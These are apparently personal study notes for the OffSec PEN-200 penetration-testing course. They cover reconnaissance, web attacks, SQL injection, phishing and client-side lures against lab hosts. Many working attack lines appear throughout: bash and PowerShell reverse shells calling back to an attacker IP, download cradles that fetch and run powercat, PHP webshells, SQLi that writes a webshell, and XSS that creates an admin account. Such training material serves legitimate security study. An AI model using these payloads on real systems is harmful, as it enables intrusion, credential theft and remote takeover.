## 📑 Table of Contents

- [Resources](#resources)
- [PWK-200 syallabus](#pwk-200-syallabus) 
  - [6. Information gathering](#6-information-gathering)
  - [7. Vulnerability scanning](#7-vulnerability-scanning)
  - [8. Introduction to web applcation attacks](#8-introduction-to-web-applcation-attacks)
  - [9. Common Web Application attacks](#9-common-web-application-attacks)
  - [10. SQL injection attacks](#10-sql-injection-attacks)
  - [11. Phishing Basics](#11-phishing-basics)
  - [12. Client-site attacks](#12-client-site-attacks)
  - [13. Locating public exploits](#13-locating-public-exploits)
  - [14. Fixing exploits](#14-fixing-exploits)
  - [15. Password attacks](#15-password-attacks)
  - [16. Antivirus evasion](#16-antivirus-evasion)
  - [17. Windows Privilege Escalation](#17-windows-privilege-escalation)
  - [18. Linux privilege escalation](#18-linux-privilege-escalation)
  - [19. Port redirection and SSH tunneling](#19-port-redirection-and-ssh-tunneling)
  - [20. Tunneling through deep packet inspectation](#20-tunneling-through-deep-packet-inspectation)
  - [21. The metasploit framework](#21-the-metasploit-framework)
  - [22. Active directory introduction and enumeration](#22-active-directory-introduction-and-enumeration)
  - [23. Attacking active drectiory authentication](#23-attacking-active-drectiory-authentication)
  - [24. Lateral movement in active directory](#24-lateral-movement-in-active-directory)
  - [25. Enumerating AWS Cloud Infrastruture](#25-enumerating-aws-cloud-infrastruture)
  - [26. Attacking AWS cloud infrastruture](#26-attacking-aws-cloud-infrastruture)
  - [27. Assembling the pieces](#27-assembling-the-pieces)
- [PWK-200 labs](#pwk-200-labs)  
  - [Information gathering](#information-gathering)
  - [Introduction to web application attacks](#introduction-to-web-application-attacks)
  - [Common Web Application attacks](#common-web-application-attacks)
  - [SQL injection attacks](#sql-injection-attacks)
  - [Client-site attacks](#client-site-attacks)
  - [Locating public exploits](#locating-public-exploits)
  - [Fixing exploits](#fixing-exploits)
  - [Antivirus evasion](#antivirus-evasion)
  - [Password attacks](#password-attacks)
  - [Windows privilege escalation](#windows-privilege-escalation)
  - [Linux privilege escalation](#linux-privilege-escalation)
  - [Port redirection and SSH tunneling](#port-redirection-and-ssh-tunneling)
  - [Tunneling through deep packet inspectation](#tunneling-through-deep-packet-inspectation)
  - [The metasploit framework](#the-metasploit-framework)
  - [Active directory introduction and enumeration](#active-directory-introduction-and-enumeration)
  - [Attacking active drectiory authentication](#attacking-active-drectiory-authentication)
  - [Lateral movement in active directory](#lateral-movement-in-active-directory)
  - [Enumerating AWS Cloud Infrastruture](#enumerating-aws-cloud-infrastruture)
  - [Attacking AWS cloud infrastruture](#attacking-aws-cloud-infrastruture)
  - [Assembling the pieces](#assembling-the-pieces)
- [Kali setup](#kali-setup)

## Resources
- [OffSec student portal](https://help.offsec.com/hc/en-us/articles/9550819362964-Connectivity-Guide) 
- [OffSec Discord](https://discord.gg/offsec)
  - OffSec portal > Explorer > Discord > link OffSec account to discord
- [OffSec Study Plan and Exam FAQ](https://help.offsec.com/hc/en-us/sections/6970444968596-Penetration-Testing-with-Kali-Linux-PEN-200)

## PWK-200 syallabus
### 6. Information gathering  
   **Passive**
   - **OSINT**: public available info of a target
   - **Whois**: domain name info  
     `whois megacorpone.com -h 192.168.50.251`: lookup personnel contact, name server  
     `whois 38.100.193.70 -h 192.168.50.251`: reverse lookup
   - **google hacking**: uncover critical information, vulnerabilities, and misconfigured websites  
     `site:mega.com filetype:txt`  
     `site:mega.com -filetype:html` : exclude html page  
     `intitle: "index of" "parent directory"`: directory listing
   - [Google hacking database](https://www.exploit-db.com/google-hacking-database)
   - [faster google dorking](https://dorksearch.com/)
   - [Netcraft](https://searchdns.netcraft.com/): discover site tech, subdomains
   - [wappalzer](https://www.wappalyzer.com/websites/<domain>/)
   - **open-source code** search (small repo:[GitHub](https://github.com/), [GitHub Gist](https://gist.github.com/), [GitLab](https://about.gitlab.com/), [SourceForge](https://sourceforge.net/). larger repos: [Gitrob](https://github.com/michenriksen/gitrob), [Gitleaks](https://github.com/zricethezav/gitleaks))  
     `./gitleaks dir /home/kali/offsec/megacorpone.com/megacorpone -v`: scans for API keys, private keys, credentials
   - [Shodan](https://www.shodan.io/): search engine for internet-connected devices to discover servers, devices, DBs, IoT
   - [security headers and SSL/TLS](https://securityheaders.com/)
   - [Qualys SSL Labs](https://www.ssllabs.com/ssltest/)
   - LLM: chatGPT prompt; can you provide the best 20 google dorks for megacorpone.com website tailored for a penetration test; Retrieve the technology stack of the megacorpone.com website; 20 Google dorks aimed to our target website

   **Active**
   - **DNS (friendly domain names to IP)**
     - NS (authoritative server), A (IPv4), AAAA (Ipv6), MX (Main exchange), PTR (reverse lookup zones), CNAME (alias for other host records), TXT (domain ownershiip verification)
     - `host www.megacorpone.com`: use host to find IP/A record
     - `host -t mx www.megacorpone.com`: use -t to find other record types  
     - `host -t txt megacorpone.com`: find more info  
     - `host idontexist.megacorpone.com`: use host to search invalid host
     - `for ip in $(cat /usr/share/seclists); do host $ip.megacorpone.com; done`: find possible hostname. Note: `sudo apt install seclists`
     - `for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"`: using reverse DNS lookups to scan IP 51.122.169.200-254 and filter out not found results
     - `dnsrecon -d megacorpone.com -t std`: automate DNS enumeration (domain name + standard type enumeration)
     - `dnsrecon -d megacorpone.com -D ~/list.txt -t brt`: brute force hostname by dnsrecon
     - `dnsenum megacorpone.com`: automate DNS enumeration
     - `xfreerdp /u:student /p:lab /v:192.168.50.152`: rdp login
     - `nslookup mail.megacorptwo.com`: use nslookup to enumerate host
     - `nslookup -type=TXT info.megacorptwo.com 192.168.50.151`: use nslookup to query more info
   - **TCP/UDP port scan**
     - `nc -nvv -w 1 -z 192.168.50.152 3388-3390`: netcat TCP port scan
     - `nc -nv -u -z -w 1 192.168.50.149 120-123`: netcat UDP port scan
     - `nmap 192.168.50.149`: default 1000 ports scan
     - `sudo nmap -sS 192.168.50.149`: SYN/stealth scan
     - `nmap -sT 192.168.50.149`: TCP connect scan
     - `sudo nmap -sU 192.168.50.149`: UDP scan
     - `sudo nmap -sU -sS 192.168.50.149`: UDP + SYN scan (reveal additional open UDP ports)
     - `nmap -sn 192.168.50.1-253`: network sweep for large volumes of hosts. 
     - `nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt` `grep Up ping-sweep.txt | cut -d " " -f 2`: grep live host
     - `nmap -p 80 192.168.50.1-253 -oG web-sweep.txt`: scan for port 80
     - `nmap -sT -A --top-ports=20 192.168.50.1-253 -oG top-port-sweep.txt`: scan multiple IPs
     - `cat /usr/share/nmap/nmap-services`: show open frequency
     - `sudo nmap -O 192.168.50.14 --osscan-guess`: OS finger printing
     - `nmap -sT -A 192.168.50.14`: banner grabbing and/or service enumeration
     - `nmap --script http-headers 192.168.50.6`: nmap’s scripting engine (NSE) for OS fingerprinting
     - `Test-NetConnection -Port 445 192.168.50.151`: Port scanning SMB via PowerShell. Result returns TcpTestSucceeded : True
     - `1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null`: Automating the PowerShell portscanning****
   - **SMB Enumeration**
     - `nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254`: scan for the NetBIOS service  
     - `sudo nbtscan -r 192.168.50.0/24`: nbtscan to collect additional NetBIOS information  
     - `ls -1 /usr/share/nmap/scripts/smb*`: Finding various nmap SMB NSE scripts (SMBv1)  
     - `nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152`: nmap scripting engine to perform OS discovery (might be incorrect)  
     - `net view \\dc01 /all`: ‘net view’ to list remote shares  
   - **SMTP Enumeration**
     - `nc -nv 192.168.50.8 25`: Using nc to validate SMTP users  
     - `python3 smtp.py root 192.168.50.8`: Python script to perform SMTP user enumeration  
     - `Test-NetConnection -Port 25 192.168.50.8`: Port scanning SMB via PowerShell. `dism /online /Enable-Feature /FeatureName:TelnetClient`: install TelnetClient. `telnet 192.168.50.8 25`: interat with SMTP service via Telnet on Windows  
   - **SNMP Enumeration**
     - Ip spoofing， replay attacks, SNMPv1,2,2c no traffic encryption
     - `sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt`: nmap SNMP scan to obtain email (c:community string, v:SNMP version, t:timeout)
     - Using onesixtyone to brute force community strings
       ```
       echo public > community
       echo private >> community
       echo manager >> community
       for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
       onesixtyone -c community -i ips
       ```
     - `snmpwalk -c public -v1 -t 10 192.168.50.151`: snmpwalk to enumerate the entire MIB tree
     - `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25`: snmpwalk (OID) to enumerate Windows users
     - `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2`: snmpwalk to enumerate Windows processes
     - `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2`: snmpwalk to enumerate installed software
     -  `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3`: snmpwalk to enumerate open TCP ports
   - **nmap**  
     `nmap -sVC -p- -v -T4 -sT --open IP_ADDRESS -oN results`: scans all open 65535 TCP ports  
     `sudo nmap -sU -p 1-1024 -v IP_ADDRESS -oA results_UDP`: scans 1-1024 common UDP ports  

      | Flag         | Description                                                                 |
      |--------------|-----------------------------------------------------------------------------|
      | `-sV`        | Enables **version detection** to identify software versions on services     |
      | `-sC`        | Runs Nmap’s **default NSE scripts** (same as `--script=default`)            |
      | `-p-`        | Scans **all 65535 TCP ports**                                               |
      | `-v`         | Enables **verbose output** to see scan progress in real time                |
      | `-T4`        | Sets scan to **aggressive timing** (faster, less stealthy)                  |
      | `-sT`        | Performs a **TCP connect scan** (full 3-way handshake, useful if not root)  |
      | `--open`     | Shows **only open ports**, hides closed or filtered ports                   |
      | `IP_ADDRESS` | Target IP address to scan (replace with actual target)                      |
      | `-oN results`| Saves output in **normal format** to a file named `results`                 |

  **LLM Passive Information Gathering**
  - Using public data from MegacorpOne's website and any information that can be inferred about its organizational structure, products, or services, generate a comprehensive list of potential subdomain names: DNS subdomain wordlist
  - `gobuster dns -d megacorpone.com -w wordlist.txt -t 10`: gobuster DNS subdomain enumeration with our LLM-generated wordlist
  - What is the WHOIS information for the domain megacorpone.com?" Based on the response, who is listed as the registrant of megacorpone.com?
  - Can you generate the best Google dorks for the website megacorpone.com?
  - What public information is available about the leadership of MegacorpOne.com and their social media presence?
  - Can you provide the top Google dorks to search for exposed repositories related to megacorpone.com?
    
### 7. Vulnerability scanning
   - host discovery
   - port scanning
   - OS, service, version detection
   - Matching results to vulnerability db ([NVD](https://nvd.nist.gov/), [CVE](https://cve.mitre.org/cve/search_cve_list.html), [CVSS](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/vulnerability-scanning-theory-48706/how-vulnerability-scanners-work-48663), [CVSS calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator))  
   - unauthenticated (view from external attacker) and authenticated scan (privileged user check for vulnerable packages, missing patches, or configuration vulnerabilities)
   - internal vulnerability scan (VPN or scan on-site) and DMZ + External (public facing) scan
   - consideration: scanning duration, accessible, firewalls, rate limiting, impact
   - [Nessus scan](https://www.tenable.com/downloads/nessus?loginAttempted=true) (pg 173 install) > scan template > launch scan > host > findings > vulnerability priority rating (VPR) > remediation > report
     ```
     echo "4987776fef98bb2a72515abc0529e90572778b1d7aeeb1939179ff1f4de1440d Nessus-10.5.0- debian10_amd64.deb" > sha256sum_nessus
     sha256sum -c sha256sum_nessus
     sudo apt install ./Nessus-10.5.0-debian10_amd64.deb
     sudo /bin/systemctl start nessusd.service (start nessus after successful Nessus install)
     ```  
     - launch a browser https://127.0.0.1:8834
     - Nessus scan templates: discovery (host), compliance (windows config compliance), vulnerabilities (CVE, missing patches, minconfig)
     - Basic network scan: name, targets (IP), custom scan type (port 80,443), ping remote host (off)
     - Authenticated scan: credential patch audit, credentials (SSH; SMB or WMI against Windows), AV/Firewall/UAC blocking check
     - Specific plugin: Advanced Dynamic Scan, credentilas, Dynamic Plugins (CVE), select plugin family (ubuntu local security checks)
   - nmap NSE
     - found in "/usr/share/nmap/scripts/"
     - `sudo nmap --script-updatedb`
     - `sudo nmap -sV -p 443 --script "vuln" 192.168.50.124`: vuln scan n port 443
     - Google "CVE-2021-41773 nse" and download NSE from github  
       `sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse`  
       `sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124`: provide vuln name, target, port > additional vulnerability  
       
### 8. Introduction to web applcation attacks
   - **Fingerprinting Web Servers** with Nmap  
     `sudo nmap -p80 -sV 192.168.50.20`: grab the web server banner  
     `sudo nmap -p80 --script=http-enum 192.168.50.20`: NSE enum web server (pages discovery)  
   - [Wappalyzer](https://www.wappalyzer.com/): technology stack
   - [Gobuster](https://www.kali.org/tools/gobuster/): wordlists to discover directories and files  
     `gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t5`  
   - Burp Suite
     - Only http traffic, no cert install_, enable_intercept(forward or drop), proxy listerner on localhost:8080
     - Browser proxy setting: about:preferences#general > settings > networks setting > http proxy (host 127.0.0.1,port 8080 + use this proxy for HTTPS) & SOCKSv4 (host 127.0.0.1, port 9060)
   - Burp Suite intercept, proxy > HTTP history > send to repeater (send request), intruder (brute force attack in $position)
   - URL file extension, Debug page content (browser tool 'debugger' + pretty print + inspector tool)
   - inspect HTTP response headers and sitemaps (browser tool 'network')
   - sitemaps `curl https://www.google.com/robots.txt`
   - Gobuster: enumerate APIs  
     **pattern file**  
     {GOBUSTER}/v1  
     {GOBUSTER}/v2  
  
     ```
     gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern: brute force API paths
     curl -i http://192.168.50.16:5002/users/v1: obtain user info
     gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt: discover extra APIs
     curl -i http://192.168.50.16:5002/users/v1/admin/password: probe API > unsupported method
     curl -i http://192.168.50.16:5002/users/v1/login: inspect 'login' API > user not found
     curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json http://192.168.50.16:5002/users/v1/login: POST request > password is not correct for the given username
     curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register: Register > email required  
     curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register: POST request register success
     curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type:application/json' http://192.168.50.16:5002/users/v1/login: login as admin > token received

     Change the Administrator Password
     curl -X 'PUT' \
      'http://192.168.50.16:5002/users/v1/admin/password' \
      -H 'Content-Type: application/json' \
      -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb IHbJI7f9KaRAkrywoaRUAsgA4' \
      -d '{"password": "pwned"}'
      ```

  - **Cross-site scripting**  
     - reflected: payload in a crafted request or link. search field or user input included in error messages. 
     - stored/persistent: exploit payload is stored in a database. web application then retrieves this payload and displays it to anyone who visits a vulnerable page. forum comment, product review.  
     - DOM-based: page’s DOM is modified with user-controlled values  
     - identify XSS: input accepts unsanitized input `< > ' " { } ;`. URL encoding (space-%20) & HTML encoding (\-&lt;) interprete as code  
     - User-Agent `<script>alert(1)</script>`  
     - privilege escalation: steal cookies. protection (secure-send cookier over https.httpOnly-deny js access to cookies). browser tool 'Storage>Cookies'  
     - CSRF: `<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000"">Check out these awesome cat memes!</a>`  
     - Create a new WordPress Admin account  
       - exploit /wp-admin/user-new.php, retrieve nonce value in HTTP response based on the regular expression  
         `var nonceRegex = /ser" value="([^"]*?)"/g;`    
         ```
         var params = "action=createuser&_wpnonce_createuser="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
         ajaxRequest = new XMLHttpRequest();
         ajaxRequest.open("POST", requestURL, true);
         ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         ajaxRequest.send(params);
         ```
      - minify attack code into a one-liner via [JS Compress](https://jscompress.com/). Encode the minified Javascript code  
        ```
        function encode_to_javascript(string) {
          var input = string
          var output = '';
          for(pos = 0; pos < input.length; pos++) {
          output += input.charCodeAt(pos);
          if(pos != (input.length - 1)) {
          output += ",";
          }
         }
         return output;
         }
         let encoded = encode_to_javascript('insert_minified_javascript')
         console.log(encoded)
        ```
      - launch attack on user-agent field  
        ```
        curl -i http://offsecwp --user-agent
        "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,1
        ...))</script>" --proxy 127.0.0.1:8080
        ```  
        XSS stored in the WordPress DB. Login WP as admin, then click the visitor plugins

### 9. Common Web Application attacks
   - **Directory traversal**: access files outside of the web root by using relative paths (gathering info like credentials or keys that lead to system access)  
     - `ls ../`: root system
     - `ls ../../`: backward to 2 previous directories 
     - absolute path: `cat /home/kali/etc/passwd`  
     - relative path: `cat ../../etc/pwd`: move 2 directories back to root file
     - extra ../sequence: `cat ../../../../../../../../../../../etc/passwd`
     - hovering the site and find "http://mountaindesserts.com/meteor/index.php?page=admin.php"  
     - `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`
        The output of /etc/passwd shows a user called "offsec"
     - `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`
     - `chmod 400 dt_key`
     - `ssh -i dt_key -p 2222 offsec@mountaindesserts.com`: connect SSH from stolen private key
     - `curl http://192.168.50.16/cgibin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`: URL encoding ../
   - **File inclusion vulnerabilities**: allow us to “include” a file in the application’s running code.
     - **Local file inclusion (LFI)** Includes files from the local server filesystem. E.g http://target.com/index.php?page=../../../../etc/passwd
       - `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log`: Log entry of Apache’s access.log. Response incude user agent info  
       - `<?php echo system($_GET['cmd']); ?>`: modify user agent header to include PHP snippet
       - `../../../../../../../../../var/log/apache2/access.log&cmd=ps`: execute the command. output to access.log
       - `../../../../../../../../../var/log/apache2/access.log&cmd=la%20-la`: URL encoding to bypass the bad request error of space
       - `bash -i >& /dev/tcp/192.168.119.3/4444 0>&1`: shell or `bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"`: bash reverse shell
       - `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22`: encode the special chr with URL encoding
       - before we send the request, start Netcat listener on port 4444. it will receive the incoming reverse shell from the target system `nc -nvlp 4444`
       - target run on "XAMPP", apache logs found in C:\xampp\apache\logs\
     - **PHP wrappers** can be used to represent and access local or remote filesystems. Use this to bypass filters or obtain code execution via File Inclusion vulnerabilities.
       - `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php`: “php://filter” to include unencoded admin.php
       - `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`: “php://filter” to include base64 encoded admin.php
       - `echo <base64 encoded text> | base64 -d`: Decoding the base64 encoded content of admin.php. Decooded data contains MySQL credentials
       - `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`: Usage of the “data://” wrapper to execute ls
       - `echo -n '<?php echo system($_GET["cmd"]);?>' | base64` output: PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
       - `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`: bypass filter system command
       - data:// will not work in a default PHP installation. To exploit it, the "allow_url_include" setting needs to be enabled
     - **Remote file inclusion (RFI)** : include files from a remote system over HTTP or SMB. E.g http://target.com/index.php?page=http://attacker.com/shell.txt
       - Requires allow_url_include=On in PHP config  
       - PHP webshell locates in kali "/usr/share/webshells/php/"  
       - remote file must access by target system. Use Python3 http.server to start a web server    
         `/usr/share/webshells/php/$ python3 -m http.server 80` or GitHub accessible file  
       - `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"`: Exploiting RFI with a PHP backdoor and execution of ls
     - **File upload vulnerabilities**
       - scenarios: directory traversal + overwrite authorized_keys; file upload XXE or XSS; macros in docx.  
       - file upload + code execution to obtain reverse shell  
       - **upload txt file** (acceped) > bypass php file extension (.phps, .php7, pHP)  
       - **execute command** `curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir`  
       - kali webshells at **"/usr/share/webshells/"**
       - step 2: netcat listener `nc -nvlp 4444` while listening 
       - step 3: PowerShell one-liner to encode the reverse shell  
       - step 4: execute the base64 encoded reverse shell oneliner
         ```
         curl http://192.168.50.189/meteor/uploads/simplebackdoor.pHP?cmd=powershell%20-
         enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUA
         dAAuAFMAbwBjAGsAZQB0
         ...
         AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjA
         GwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
         ```
      - trial and error tricks: upload file 2 times (file already exists then burte force, error for language/web tech)  
      - **modify the filename** `../../../../../test.txt` in burp request  
      - overwrite the authorized_keys (non executable file)    
        - `ssh-keygen` : generate public/private rsa key pair
        - `cat fileup.pub > authorized_keys` : our public key  
        - `./../../../../../../root/.ssh/authorized_key` upload it using the relative path (burp intercept the request and modify the filename > forward)  
        - `rm ~/.ssh/known_hosts`: avoid error that cannot verify the host key saved previously  
        - `ssh -p 2222 -i fileup root@mountaindesserts.com`: use our private key to ssh
   - **Command injection**  
     - git clone https://gitlab.com/exploit-database/exploitdb.git (skip this step)  
     - bad commands detected (ipconfig), try git
     - `curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive` : %3B is semi colon, windows use 1 ampersand  
     - identify the commands are executed by PowerShell or CMD  
     - (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell: Code Snippet to check where our code is executed  
     - `curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive`: URL encoding. Output shows PowerShell  
      
     - `cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .`use PowerCat to create a reverse shell  
     - `python3 -m http.server 80`
     - `nc -nvlp 4444`  
     - `IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell`: Command to download PowerCat and execute a reverse shell  
     - `curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive`  

### 10. SQL injection attacks  
- MySQL, Microsoft SQL Server, PostgreSQL, and Oracle
- `mysql -u root -p'root' -h 192.168.50.16 -P 3306`: connect mysql
- `select version();  select system_user();  show databases;  SELECT user, authentication_string FROM mysql.user WHERE user ='offsec';`. password hashing [Caching-SHA-256 algorithm]
- `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`: remote MSSQL via Kali Impacket  
- `SELECT @@version;  SELECT name FROM sys.databases;  SELECT * FROM offsec.information_schema.tables;  select * from offsec.dbo.users`
- SELECT * FROM users WHERE user_name= 'offsec  `' OR 1=1 --`: bypass login
- Error-based
  - error msg (invalid password) > single quote > payload `' OR 1=1 --//` > enumerate DB `' or 1=1 in (select @@version) -- //` > users `' OR 1=1 in (SELECT * FROM users) -- //`
- Union-based
  - 2 conditions: same number of columns ; data type for each column
  - `' ORDER BY 1-- //`: discover the correct number of columns, increasing the column value by one each time
  - `%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //`: which columns are displayed
  - `%' UNION SELECT database(), user(), @@version, null, null -- //`: enumerating the DB
  - `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`: table
  - `' UNION SELECT null, username, password, description, null FROM users -- //`: column
- Blind-based (boolean or time-based)
  - `offsec' AND 1=1 -- //`: return true if record exist
  - `offsec' AND IF (1=1, sleep(3),'false') -- //`: sleep 3 reconds if true
- xp_cmdshell (manual attack) 
  - Enable xp_cmdshell  
    `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`  
    `EXECUTE sp_configure 'show advanced options', 1;`  
    `RECONFIGURE;`  
    `EXECUTE sp_configure 'xp_cmdshell', 1;`  
    `RECONFIGURE;`  
  - `EXECUTE xp_cmdshell 'whoami';`  
- write files on web server
  - `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE '/var/www/html/webshell.php' #`
  - `192xxx/tmp/webshell.php?cmd=id`  
- Sqlmap (automating attack)
  - `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user`: find injection point  
  - `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump`: dump entire database  
  - `sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html"`: os-shell with POST.txt  
    
### 11. Phishing Basics
- broad phishing (mass attacks) and spear phishing (targeted attacks).
- smishing= (SMS phishing), vishing (voice phishing), and deepfake
- objective: malicious code or stealing login credentials
- email domain failter, file attachment
- Malicious Office Macros (Macro). Mark of the Web (MotW）a file attribute set by Windows when a file is downloaded from an external source.
- Malicious files SCR files, HTA files, and JScript files
- `wget -E -k -K -p -e robots=off -H -Dzoom.us -nd "https://zoom.us/signin#/login"`: Cloning the password reset page, using the link sent to us by Zoom
- `sudo python -m http.server 80`
- remove csrfGuard code
- move phishing page to our web server
  ```
  mv -f * /var/www/html
  systemctl start apache2
  cd /var/www/html
  ```
   
### 12. Client-site attacks  
- metadata analysis: google dork (site:example.com filetype:pdf), gobuster -x (file extension)
- `exiftool -a -u brochure.pdf`: retrieve metadata
- [Canarytoken](https://canarytokens.org/nest/): fingerprint
- MOTW (Mark of the Web) is not added to files on FAT32-formatted devices because FAT32 does not support NTFS Alternate Data Streams (ADS), which is where MOTW is stored.
- macros in files downloaded from the internet (with MOTW) are blocked by default, and users can no longer enable them with a single click (like the old “Enable Content” button). Instead, they must explicitly unblock the file via the file properties or follow other administrative steps.
- possible to avoid getting a file flagged with Mark of the Web (MOTW) by embedding it within container formats such as .7z, .iso, or .img

**Obtaining Code Execution via Windows Library Files**  
Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upload/download files, map like a network drive
  ```
  sudo apt install pipx -y
  pipx ensurepath
  pipx install wsgidav
  ```
- Create a shared folder (/home/kali/share)
  `mkdir ~/share`
- Start WsgiDAV server
  `wsgidav --host=0.0.0.0 --port=8888 --auth=anonymous --root ~/share`
- On RDP Windows Machine > Right click PC > Map Network Drive  > `http://<KALI>:8888/`

**Create config.Library-ms**
- Windows Library file used as part of a local file execution or WebDAV attack to achieve arbitrary code execution or remote file retrieval
- Visual Studio Core > New File > Save as 'config.Library-ms'
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.165</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
- Open the config > WebDAV shared folder appear

**Create ShortCut > PowerShell Download Cradle and PowerCat Reverse Shell Execution**  
- Right click desktop short cut > location `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.165:8000/powercat.ps1'); powercat -c 192.168.45.165 -p 4444 -e powershell"` >  name: automatic_configuration
- Kali start Python3 web server on port 8000 where powercat.ps1 is located and start a netcat listener on port 4444
  `cd /usr/share/powershell-empire/empire/server/data/module_source/management`
  `python3 -m http.server 8000`
  `nc -nvlp 4444`

**Copy the automatic_configuration.lnk and config.Library-ms to our WebDAV directory on our Kali machine** 
- Obtain a reverse shell from target machine**  
- Upload our library fiiles to the SMB share on the target machine
- On kali cd webdav > `smbclient //192.168.158.199/share -c 'put config.Library-ms'` (target machine IP)
  
**User open the file and Incoming reverse shell from target machine `PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami`**
  
### 13. Locating public exploits  
- An exploit is a program or script that can leverage a flaw or vulnerability of a target system. E.g DoS, RCE, privilege escalation.
- caution: asking root privilege, hex-encoded string of shell command
- online exploit resource
  - [Exploit-DB](https://www.exploit-db.com/)
  - [Packet storm](https://packetstorm.news/)
  - [github](https://github.com/)
  - [offensive-security](https://github.com/offensive-security)
  - `firefox --search "Microsoft Edge site:exploit-db.com"`
  - [Exploit Framework](https://www.oreilly.com/library/view/network-security-assessment/9780596510305/ch16.html)
  - [BeEF](https://beefproject.com/)
- searchsploit
